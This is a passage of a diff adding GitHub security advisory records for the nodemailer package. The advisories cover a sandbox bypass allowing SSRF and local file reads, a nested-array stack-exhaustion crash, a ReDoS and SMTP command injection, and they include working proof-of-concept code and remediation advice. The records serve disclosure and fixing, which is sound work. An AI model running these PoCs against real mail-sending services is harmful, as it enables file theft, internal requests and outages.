demonstrated path uses direct SMTPS (`secure: true`). The STARTTLS upgrade path constructs TLS options separately and is not claimed vulnerable by this report.\n\n## Suggested remediation\n\nThe DNS cache should store DNS data only. `servername` is connection-specific TLS policy and should not be persisted in a cache keyed solely by hostname.\n\nOne approach is to remove `servername` from `DnsCacheValue` and derive the returned value from the current request on every path:\n\n```ts\nreturn {\n    host: selectedAddress,\n    servername: options.servername || options.host || false,\n    _addresses: addresses,\n    cached: true\n};\n```\n\nAs defense in depth, `_resolveAndConnect()` should not overwrite an explicitly configured `opts.servername` with resolver metadata. Keying the cache by both host and server name would avoid this particular collision, but keeping TLS identity out of a DNS-address cache provides a cleaner separation.\n\nA regression test should create two direct-TLS transports in the same process with the same DNS host and different explicit server names, then assert that each TLS connection observes and verifies its own configured name regardless of cache order.",
+      "aliases": [
+        "CVE-2026-100701"
+      ],
+      "modified": "2026-09-28T22:00:08.256596460Z",
+      "published": "2026-09-28T21:56:05Z",
+      "database_specific": {
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-295"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-09-28T21:56:05Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-6vj9-mwq6-2f5v"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/a6512dbcb3c6e7f2f70d3acccc5752defe3c61fe"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v10.0.2"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "5.0.0"
+                },
+                {
+                  "fixed": "10.0.2"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-6vj9-mwq6-2f5v/GHSA-6vj9-mwq6-2f5v.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-8m3c-c648-2xjj",
+      "summary": "Nodemailer: resolveContent() on a MailMessage bypasses disableFileAccess/disableUrlAccess when called with the legacy signature",
+      "details": "### Summary\n\nNodemailer's `disableFileAccess` / `disableUrlAccess` options are a security sandbox that lets an application forbid untrusted message content (`html`/`text`/attachment `path`/`href`) from reading local files or making outbound HTTP(S) requests. The fix for GHSA-wqvq-jvpq-h66f (commit `5f69497`) threaded these flags through the library's internal resolution paths (`MailMessage.resolveAll()` and `_convertDataImages()`), but the public plugin API `MailMessage.resolveContent(...args)` (`lib/mailer/mail-message.js:41-43`) remains a raw passthrough to `shared.resolveContent()`.\n\nWhen called with the documented legacy signature `mail.resolveContent(data, key, callback)`, `shared.resolveContent` normalizes the missing options argument to an empty object (`options = options || {}`, `lib/shared/index.js:530`). The message-level flags that the `MailMessage` constructor already copied into `mail.data` (`lib/mailer/mail-message.js:34-38`) are silently discarded, so `resolveContentValue` skips both access-control guards and reaches `nmfetch(url)` (SSRF, `lib/shared/index.js:588`) or `fs.createReadStream(path)` (arbitrary file read, `lib/shared/index.js:597`).\n\nA plugin or application code that resolves message content through the documented API (the same API the library's own `_convertDataImages` uses, threading the flags explicitly) thereby bypasses the sandbox an application deliberately enabled.\n\n### Details\n\nRoot cause. The `MailMessage` constructor stores the transporter-level sandbox flags on the message object (`lib/mailer/mail-message.js:34-38`):\n\n```js\n['disableFileAccess', 'disableUrlAccess', 'normalizeHeaderKey', 'maxRecipients'].forEach(key => {\n    if (key in options) {\n        this.data[key] = options[key];\n    }\n});\n```\n\nThe public resolver is a pure passthrough (`lib/mailer/mail-message.js:41-43`):\n\n```js\nresolveContent(...args) {\n    return shared.resolveContent(...args);\n}\n```\n\n`shared.resolveContent` supports the legacy 3-argument signature and collapses the missing options to `{}` (`lib/shared/index.js:524-530`):\n\n```js\nmodule.exports.resolveContent = (data, key, options, callback) => {\n    // options is optional; support the legacy resolveContent(data, key, callback) signature\n    if (!callback && typeof options === 'function') {\n        callback = options;\n        options = false;\n    }\n    options = options || {};\n    ...\n    resolveContentValue(data, key, options, callback);\n```\n\n`resolveContentValue` then checks `options.disableUrlAccess` / `options.disableFileAccess` (`lib/shared/index.js:581` / `:590`), both `undefined` for the legacy signature, so it falls through to `nmfetch` (`:588`) or `fs.createReadStream` (`:597`).\n\nContrast with the fixed paths. `resolveAll()` (`lib/mailer/mail-message.js:112-115`) and `_convertDataImages()` (`lib/mailer/index.js:437-440`) both pass the message flags explicitly. The MIME streaming path (`lib/mime-node/index.js:1059-1077`) also honors the flags. So an application that enables the sandbox and then calls `transporter.sendMail()` is protected; the bypass appears only when message content is resolved through the public legacy-signature API \u2014 which is the documented plugin usage (the `resolveContent` JSDoc at `lib/shared/index.js:510-523` states it is \"useful when you want to create a plugin that needs a content value\").\n\nAffected versions. Confirmed on `9.1.0` (HEAD `efd6e29c10c6e0c25c57bd2f2a71302838235a4f`, the current npm latest). The gap was introduced by the GHSA-wqvq-jvpq-h66f fix and is still present; the public API has no regression coverage (`test/mailer/mail-message-test.js` contains no `resolveContent` test).\n\n### PoC\n\nRequires: `nodemailer@9.1.0`, a readable local file, and any reachable HTTP endpoint (loopback suffices). Non-destructive; no network egress beyond a local listener.\n\n```js\n'use strict';\nconst nodemailer = require('nodemailer');\nconst MailMessage = require('nodemailer/lib/mailer/mail-message');\n\nconst TARGET_FILE = '/app/src/package.json';   // any readable local file\nconst SSRF_URL = 'http://http-sink:8080/poc-ssrf'; // any local/internal HTTP target\n\nconst transporter = nodemailer.createTransport({\n    streamTransport: true,\n    disableFileAccess: true,   // sandbox explicitly enabled\n    disableUrlAccess: true\n});\n\nconst data = {\n    from: 'a@example.com', to: 'b@example.com', subject: 'poc', text: 'hello',\n    html: { path: TARGET_FILE },\n    attachments: [{ filename: 'x.bin', href: SSRF_URL }]\n};\nconst mail = new MailMessage(transporter, data);\n// mail.data.disableFileAccess === true, mail.data.disableUrlAccess === true\n\n// Documented legacy plugin signature \u2014 options argument omitted:\nmail.resolveContent(mail.data, 'html', (err, value) => {\n    if (err) return console.log('BLOCKED', err.code);\n    console.log('FILE_READ_OK len=', value.length);          // -> 1647 (package.json)\n});\nmail.resolveContent(mail.data.attachments, 0, (err, body) => {\n    if (err) return console.log('BLOCKED', err.code);\n    console.log('URL_FETCH_OK body=', body.toString());      // -> fetched response\n});\n```\n\nObserved output on the audit environment (Node 22, `nodemailer@9.1.0`):\n\n```text\nmail.data.disableFileAccess = true | disableUrlAccess = true\n[CONTROL resolveAll] err = EFILEACCESS : File access rejected for /app/src/package.json\n[CONTROL html.path explicit-options] err = EFILEACCESS\n[BYPASS html.path legacy] READ OK len = 1647 head = \"{\\n    \\\"name\\\": \\\"nodemailer\\\",\\n    \\\"version\\\": \\\"9.1.0\\\",\\n    \\\"des\"\n[BYPASS att[0].href legacy] FETCH OK len = 13 body = \"HTTP-SINK OK\\n\"\n```\n\nThe negative controls (`resolveAll`, and `resolveContent` with explicit `{ disableFileAccess: true }`) return `EFILEACCESS`, proving the sandbox works on the protected paths and only the legacy-signature passthrough is bypassed. The same bypass reproduces inside a real `transporter.sendMail()` flow when a `compile` plugin calls `mail.resolveContent(mail.data, 'html', cb)` / `mail.resolveContent(mail.data.attachments, 0, cb)`.\n\n### Impact\n\nAn application that enables `disableFileAccess` / `disableUrlAccess` to contain untrusted message content and that resolves content through the documented plugin API (`mail.resolveContent(data, key, callback)`) has its sandbox silently bypassed:\n\n- Arbitrary local file disclosure: a message `html`/attachment `path` pointing at a server file (`/etc/passwd`, `.env`, key material) is read and returned to the caller / delivered in the message.\n- Server-side request forgery: a message `href` pointing at an internal or loopback URL is fetched from the application host.\n\nReachability precondition: the sandbox flags must be enabled (default off) and the application or its plugin must invoke the documented legacy-signature API on attacker-influenced data. The default `transporter.sendMail()` path remains protected, so this is a defense-in-depth gap in the library's own access-control enforcement rather than a default-flow bypass. It is the same vulnerability class as the previously accepted GHSA-wqvq-jvpq-h66f (CVE-2026-82660) and GHSA-p6gq-j5cr-w38f (CVE-2026-82659), on a distinct third code path.",
+      "aliases": [
+        "CVE-2026-92595"
+      ],
+      "modified": "2026-09-17T11:56:00.648821018Z",
+      "published": "2026-09-08T21:16:00Z",
+      "database_specific": {
+        "github_reviewed_at": "2026-09-08T21:16:00Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-73",
+          "CWE-918"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-8m3c-c648-2xjj"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/ab7ef348b9a97b1fd70e7bfbeb56d4ea4a07946b"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/dc48ed395c4d6c79ee5c95eb6eff17bafe391474"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v9.1.1"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "9.1.1"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-8m3c-c648-2xjj/GHSA-8m3c-c648-2xjj.json",
+            "last_known_affected_version_range": "<= 9.1.0"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-8vvx-rff5-p5rq",
+      "summary": "Nodemailer: Nested structured recipient arrays bypass the parser depth limit and cause stack exhaustion DoS",
+      "details": "## Submission metadata\n\n| Field | Value |\n|---|---|\n| Ecosystem | npm |\n| Package | `nodemailer` |\n| Repository | https://github.com/nodemailer/nodemailer |\n| Tested commit | `40d52215aac65b811d7e131bc916f68605efd9d2` |\n| Current tested version | `10.0.1` |\n| Confirmed vulnerable versions | `2.7.2`, `3.0.0`, `7.0.11`, `9.1.1`, `10.0.1` |\n| Proposed affected range | `>= 2.7.2, <= 10.0.1` |\n| Patched version | 10.0.2 |\n\n## Summary\n\nNodemailer 10.0.1 does not safely process deeply nested arrays supplied through recipient fields such as `to`, `cc`, and `bcc`.\n\nThe public `MimeNodeAddressInput` type recursively permits arrays, but `MimeNode._parseAddresses()` flattens only the outermost array. A remaining nested array is passed to `addressparser()`, whose `Tokenizer` coerces the input with `.toString()`. Native `Array.prototype.toString()` recursively processes every nested array through `join()` and `toString()` until the V8 call stack is exhausted.\n\nA valid 10,021-byte JSON recipient value containing one address wrapped in 5,000 arrays causes:\n\n```text\nRangeError: Maximum call stack size exceeded\n```\n\nThe exception occurs through the normal `sendMail()` API before the `maxRecipients` limit is evaluated. If the integrating application does not catch the synchronous exception around the complete `sendMail()` invocation, the Node.js worker or server process terminates.\n\nNo SMTP server, remote host, large attachment, or successful email delivery is required.\n\nThis is distinct from GHSA-rcmh-qjqh-p98v / CVE-2025-14874. The previous vulnerability concerned recursive parsing of RFC 5322 group **strings**. This report uses Nodemailer's structured recipient-array input and never reaches the parser's `MAX_NESTED_GROUP_DEPTH` protection.\n\n## Security impact\n\nAn attacker who can control a recipient field passed to Nodemailer can trigger stack exhaustion using a roughly 10 KB JSON value. Potentially affected integrations include:\n\n- Email-sending HTTP APIs that accept structured recipient values.\n- Notification workers consuming JSON jobs from a queue.\n- Template or automation systems that forward parsed recipient data to `sendMail()`.\n- Multi-tenant applications that allow users to configure message recipients.\n\nWhen the exception is not caught, a single request or queue item can terminate the process handling mail. A process manager may restart the worker, but repeated malicious inputs can keep workers in a restart loop and make the service unavailable.\n\nApplications that explicitly validate recipient values as flat strings or flat arrays before calling Nodemailer are not exposed through this path. Applications that wrap the complete synchronous `sendMail()` invocation in exception handling can prevent process termination, although an attacker can still repeatedly force failed jobs.\n\n## Attack prerequisites\n\nThe vulnerability is reachable when:\n\n1. An application accepts attacker-controlled or partially attacker-controlled recipient data.\n2. The application preserves the array structure after parsing JSON.\n3. The resulting value is passed to a Nodemailer recipient field such as `to`, `cc`, or `bcc`.\n4. The application does not impose its own nesting-depth limit before calling Nodemailer.\n\nThe proof of concept uses `jsonTransport` only to avoid requiring an SMTP server. The vulnerable address normalization and envelope construction occur before transport-specific delivery, so the root cause is not limited to `jsonTransport`.\n\n## Technical details\n\n### 1. The public input type accepts recursively nested arrays\n\nAt `src/mime-node/index.ts:67`, recipient input is recursively defined:\n\n```ts\nexport type MimeNodeAddressInput = string | MimeNodeAddress | MimeNodeAddressInput[];\n```\n\nPinned source:\n\nhttps://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/mime-node/index.ts#L67\n\nThis permits values equivalent to:\n\n```js\n[[[[['victim@example.test']]]]]\n```\n\n### 2. `_parseAddresses()` removes only the outermost array\n\nAt `src/mime-node/index.ts:1359-1385`, `_parseAddresses()` wraps the input with `[].concat(addresses)` and iterates the resulting outer array:\n\n```ts\n_parseAddresses(addresses: MimeNodeAddressInput | undefined): MimeNodeAddress[] {\n    const flattened: MimeNodeAddress[] = [];\n\n    ([] as any[]).concat(addresses).forEach(address => {\n        if (address && address.address) {\n            const normalized = this._normalizeAddress(address.address);\n            // ...\n            return;\n        }\n\n        const parsed = this._normalizeParsedAddresses(addressparser(address));\n        for (let i = 0; i < parsed.length; i++) {\n            flattened.push(parsed[i]);\n        }\n    });\n\n    return flattened;\n}\n```\n\nPinned source:\n\nhttps://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/mime-node/index.ts#L1359-L1386\n\nFor an input nested 5,000 levels deep, the callback receives an array nested 4,999 levels deep. Because this value does not have a truthy `.address` property, it is passed directly to `addressparser()`.\n\n### 3. `Tokenizer` invokes recursive native array conversion\n\nThe `Tokenizer` constructor performs the following coercion at `src/addressparser/index.ts:393`:\n\n```ts\nthis.str = (str || '').toString();\n```\n\nPinned source:\n\nhttps://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/addressparser/index.ts#L393\n\nWhen `str` is an array, this invokes `Array.prototype.toString()`. Array string conversion invokes `join()`, which converts every nested element to a string. Deeply nested arrays therefore produce native recursion resembling:\n\n```text\nArray.toString\n  -> Array.join\n     -> childArray.toString\n        -> Array.join\n           -> childArray.toString\n              -> ...\n```\n\nAt sufficient depth, V8 raises `RangeError: Maximum call stack size exceeded`.\n\n### 4. The recipient limit is applied too late\n\nNodemailer's `maxRecipients` protection is evaluated only after the message envelope has been constructed:\n\n```ts\nconst recipientCount = mail.message.getEnvelope().to.length;\n```\n\nPinned source:\n\nhttps://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/mailer/index.ts#L414-L417\n\nThe exception occurs inside `getEnvelope()`, so `maxRecipients` cannot prevent this condition.\n\n## Vulnerable code path\n\n```text\ntransporter.sendMail(message)\n  -> MailComposer(mail.data).compile()\n  -> mail.message.getEnvelope()\n  -> MimeNode._parseAddresses(message.to)\n  -> addressparser(nestedArray)\n  -> new Tokenizer(nestedArray)\n  -> nestedArray.toString()\n  -> Array.join / Array.toString recursion\n  -> RangeError: Maximum call stack size exceeded\n```\n\n## Proof of concept\n\n### Test environment\n\n```text\nOperating system: Windows 11\nNode.js: 20.20.2\nNodemailer: 10.0.1\nNodemailer commit: 40d52215aac65b811d7e131bc916f68605efd9d2\nTransport: jsonTransport\n```\n\n### Installation\n\n```console\nmkdir nodemailer-nested-array-poc\ncd nodemailer-nested-array-poc\nnpm init -y\nnpm install nodemailer@10.0.1\n```\n\nCreate `poc.mjs`:\n\n```js\nimport nodemailer from 'nodemailer';\n\nconst depth = Number(process.argv[2] || 5000);\n\n// Valid JSON containing one address wrapped in `depth` arrays.\nconst json =\n    '['.repeat(depth) +\n    '\"victim@example.test\"' +\n    ']'.repeat(depth);\n\nconst recipient = JSON.parse(json);\n\nconsole.log({\n    nodemailerVersion: '10.0.1',\n    depth,\n    jsonBytes: Buffer.byteLength(json)\n});\n\nconst transport = nodemailer.createTransport({\n    jsonTransport: true\n});\n\nawait transport.sendMail({\n    from: 'sender@example.test',\n    to: recipient,\n    subject: 'Nested recipient array PoC',\n    text: 'test'\n});\n\nconsole.log('sendMail resolved');\n```\n\n### Trigger\n\n```console\nnode poc.mjs 5000\n```\n\n### Observed result\n\n```text\n{\n  nodemailerVersion: '10.0.1',\n  depth: 5000,\n  jsonBytes: 10021\n}\n\nnode:internal/modules/run_main:123\n    triggerUncaughtException(\n    ^\n\nRangeError: Maximum call stack size exceeded\n    at Array.join (<anonymous>)\n    at Array.toString (<anonymous>)\n    at Array.join (<anonymous>)\n    at Array.toString (<anonymous>)\n    at Array.join (<anonymous>)\n    at Array.toString (<anonymous>)\n    ...\n\nNode.js v20.20.2\n```\n\nThe tested process exits with status code `1`.\n\n### Control case\n\nRunning the same code with a nesting depth of 500 succeeds:\n\n```console\nnode poc.mjs 500\n```\n\nObserved result:\n\n```text\n{\n  nodemailerVersion: '10.0.1',\n  depth: 500,\n  jsonBytes: 1021\n}\n\nsendMail resolved\n```\n\nThe difference between the trigger and control cases is only the nesting depth.\n\n### Reproduction notes\n\n- The exact failure depth is platform and runtime dependent because JavaScript stack limits vary.\n- A depth of 5,000 reliably reproduced the exception in the tested Node.js environment.\n- The payload is generated as JSON and parsed with native `JSON.parse()` to model data received by an HTTP API or queue worker.\n- No network connection is performed because `jsonTransport` is used.\n\n## Version verification\n\nThe proof of concept was executed against several released versions. Each listed version exited with `RangeError: Maximum call stack size exceeded` at a depth of 5,000:\n\n| Nodemailer version | Result |\n|---|---|\n| `2.7.2` | Vulnerable |\n| `3.0.0` | Vulnerable |\n| `7.0.11` | Vulnerable |\n| `9.1.1` | Vulnerable |\n| `10.0.1` | Vulnerable |\n\nVersion `7.0.11` is significant because it contains the fix for the previous string-group recursion advisory. Its failure confirms that this report describes a separate surviving path.\n\nThe proposed affected range is `>= 2.7.2, <= 10.0.1`, representing the versions directly confirmed during testing and the continuous vulnerable implementation observed in source history. Earlier releases were not assessed and should not be considered confirmed safe.\n\n## Difference from GHSA-rcmh-qjqh-p98v / CVE-2025-14874\n\nThe previous advisory used a crafted address **string** containing nested RFC 5322 groups:\n\n```text\ng0: g1: g2: ... victim@example.com;\n```\n\nIts recursive path was:\n\n```text\naddressparser(string)\n  -> _handleAddress()\n  -> addressparser(nested group string)\n```\n\nThat issue was mitigated by adding and propagating a parser recursion-depth counter capped by `MAX_NESTED_GROUP_DEPTH`.\n\nThis report instead supplies a structured JSON **array** through the public recipient input:\n\n```text\nMimeNode._parseAddresses(array)\n  -> addressparser(array)\n  -> Tokenizer\n  -> Array.prototype.toString()\n```\n\nThe array conversion happens before any RFC 5322 group parsing. Consequently:\n\n- No sequence of nested group delimiters is required.\n- `_handleAddress()` is not the source of recursion.\n- The `_depth` parser option is not incremented.\n- `MAX_NESTED_GROUP_DEPTH` is never consulted.\n- Releases containing the previous fix remain vulnerable.\n\nPrevious advisory:\n\nhttps://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n\n## Suggested remediation\n\nFlatten `MimeNodeAddressInput` values iteratively before passing scalar values to `addressparser()`. Nested arrays should never be implicitly converted to strings.\n\nFor example, the implementation can maintain an explicit work stack:\n\n```ts\nconst pending: unknown[] = [addresses];\nconst seenArrays = new WeakSet<object>();\n\nwhile (pending.length) {\n    const value = pending.pop();\n\n    if (Array.isArray(value)) {\n        if (seenArrays.has(value)) {\n            throw new TypeError('Cyclic recipient array');\n        }\n        seenArrays.add(value);\n\n        for (let i = value.length - 1; i >= 0; i--) {\n            pending.push(value[i]);\n        }\n        continue;\n    }\n\n    // Process only scalar strings and structured address objects here.\n}\n```\n\nAdditional hardening options include:\n\n1. Reject array nesting above an explicit maximum before any coercion.\n2. Reject unsupported recipient value types instead of passing them to `addressparser()`.\n3. Catch address-normalization exceptions and report them through the normal `sendMail()` callback or rejected Promise.\n4. Apply input-complexity checks before constructing the envelope and before evaluating `maxRecipients`.\n\nAn iterative implementation is preferable because the public TypeScript type is recursive and indicates that nested array structures are accepted inputs. Cycle detection remains necessary for direct JavaScript callers because cyclic arrays cannot originate from JSON but can be constructed in memory.\n\n## Suggested regression tests\n\nThe fix should cover:\n\n1. Deeply nested arrays containing one valid address, completing iteratively or failing with a controlled Nodemailer error.\n2. Nested inputs through `to`, `cc`, `bcc`, `replyTo`, and explicit envelope fields.\n3. A cyclic JavaScript recipient array.\n4. Ordinary flat strings and arrays, preserving existing behavior.\n5. Arrays containing structured `{ name, address }` objects.\n6. Confirmation that failures reach the callback or rejected Promise instead of escaping the documented error path.",
+      "aliases": [
+        "CVE-2026-100702"
+      ],
+      "modified": "2026-09-29T18:30:42.037908406Z",
+      "published": "2026-09-29T18:23:50Z",
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-674"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-09-29T18:23:50Z",
+        "nvd_published_at": null
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-8vvx-rff5-p5rq"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/ebe084940aef88278afc6016b78c6d1c3821bb66"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v10.0.2"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "10.0.2"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-8vvx-rff5-p5rq/GHSA-8vvx-rff5-p5rq.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9h6g-pr28-7cqp",
+      "summary": "nodemailer ReDoS when trying to send a specially crafted email",
+      "details": "### Summary\nA ReDoS vulnerability occurs when nodemailer tries to parse img files with the parameter `attachDataUrls` set, causing the stuck of event loop. \nAnother flaw was found when nodemailer tries to parse an attachments with a embedded file, causing the stuck of event loop. \n\n### Details\n\nRegex: /^data:((?:[^;]*;)*(?:[^,]*)),(.*)$/\n\nPath: compile -> getAttachments -> _processDataUrl\n\nRegex: /(<img\\b[^>]* src\\s*=[\\s\"']*)(data:([^;]+);[^\"'>\\s]+)/\n\nPath: _convertDataImages\n\n### PoC\n\nhttps://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6\nhttps://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698\n\n```js\nasync function exploit() {\n   const MailComposer = require(\\\"nodemailer/lib/mail-composer\\\");\n   const MailComposerObject = new MailComposer();\n\n   // Create a malicious data URL that will cause excessive backtracking\n   // This data URL is crafted to have a long sequence of characters that will cause the regex to backtrack\n   const maliciousDataUrl = 'data:image/png;base64,' + 'A;B;C;D;E;F;G;H;I;J;K;L;M;N;O;P;Q;R;S;T;U;V;W;X;Y;Z;'.repeat(1000) + '==';\n\n   // Call the vulnerable method with the crafted input\n   const result = await MailComposerObject._processDataUrl({ path: maliciousDataUrl });\n}\n\nawait exploit();\n```\n\n### Impact\n\nReDoS causes the event loop to stuck a specially crafted evil email can cause this problem.",
+      "aliases": [
+        "CVE-2024-58379"
+      ],
+      "modified": "2026-09-01T03:55:43.162307302Z",
+      "published": "2024-01-31T22:42:54Z",
+      "database_specific": {
+        "github_reviewed_at": "2024-01-31T22:42:54Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-1333"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-9h6g-pr28-7cqp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/dd8f5e8a4ddc99992e31df76bcff9c590035cd4a"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.9.9"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-9h6g-pr28-7cqp/GHSA-9h6g-pr28-7cqp.json",
+            "last_known_affected_version_range": "<= 6.9.8"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c7w3-x93f-qmm8",
+      "summary": "Nodemailer has SMTP command injection due to unsanitized `envelope.size` parameter",
+      "details": "### Summary\nWhen a custom `envelope` object is passed to `sendMail()` with a `size` property containing CRLF characters (`\\r\\n`), the value is concatenated directly into the SMTP `MAIL FROM` command without sanitization. This allows injection of arbitrary SMTP commands, including `RCPT TO` \u2014 silently adding attacker-controlled recipients to outgoing emails.\n\n\n### Details\nIn `lib/smtp-connection/index.js` (lines 1161-1162), the `envelope.size` value is concatenated into the SMTP `MAIL FROM` command without any CRLF sanitization:\n\n```javascript\nif (this._envelope.size && this._supportedExtensions.includes('SIZE')) {\n    args.push('SIZE=' + this._envelope.size);\n}\n```\n\nThis contrasts with other envelope parameters in the same function that ARE properly sanitized:\n- **Addresses** (`from`, `to`): validated for `[\\r\\n<>]` at lines 1107-1127\n- **DSN parameters** (`dsn.ret`, `dsn.envid`, `dsn.orcpt`): encoded via `encodeXText()` at lines 1167-1183\n\nThe `size` property reaches this code path through `MimeNode.setEnvelope()` in `lib/mime-node/index.js` (lines 854-858), which copies all non-standard envelope properties verbatim:\n\n```javascript\nconst standardFields = ['to', 'cc', 'bcc', 'from'];\nObject.keys(envelope).forEach(key => {\n    if (!standardFields.includes(key)) {\n        this._envelope[key] = envelope[key];\n    }\n});\n```\n\nSince `_sendCommand()` writes the command string followed by `\\r\\n` to the raw TCP socket, a CRLF in the `size` value terminates the `MAIL FROM` command and starts a new SMTP command.\n\nNote: by default, Nodemailer constructs the envelope automatically from the message's `from`/`to` fields and does not include `size`. This vulnerability requires the application to explicitly pass a custom `envelope` object with a `size` property to `sendMail()`. \nWhile this limits the attack surface, applications that expose envelope configuration to users are affected.\n\n### PoC\nave the following as `poc.js` and run with `node poc.js`:\n\n```javascript\nconst net = require('net');\nconst nodemailer = require('nodemailer');\n\n// Minimal SMTP server that logs raw commands\nconst server = net.createServer(socket => {\n    socket.write('220 localhost ESMTP\\r\\n');\n    let buffer = '';\n    socket.on('data', chunk => {\n        buffer += chunk.toString();\n        const lines = buffer.split('\\r\\n');\n        buffer = lines.pop();\n        for (const line of lines) {\n            if (!line) continue;\n            console.log('C:', line);\n            if (line.startsWith('EHLO')) {\n                socket.write('250-localhost\\r\\n250-SIZE 10485760\\r\\n250 OK\\r\\n');\n            } else if (line.startsWith('MAIL FROM')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('RCPT TO')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line === 'DATA') {\n                socket.write('354 Start\\r\\n');\n            } else if (line === '.') {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('QUIT')) {\n                socket.write('221 Bye\\r\\n');\n                socket.end();\n            }\n        }\n    });\n});\n\nserver.listen(0, '127.0.0.1', () => {\n    const port = server.address().port;\n    console.log('SMTP server on port', port);\n    console.log('Sending email with injected RCPT TO...\\n');\n\n    const transporter = nodemailer.createTransport({\n        host: '127.0.0.1',\n        port,\n        secure: false,\n        tls: { rejectUnauthorized: false },\n    });\n\n    transporter.sendMail({\n        from: 'sender@example.com',\n        to: 'recipient@example.com',\n        subject: 'Normal email',\n        text: 'This is a normal email.',\n        envelope: {\n            from: 'sender@example.com',\n            to: 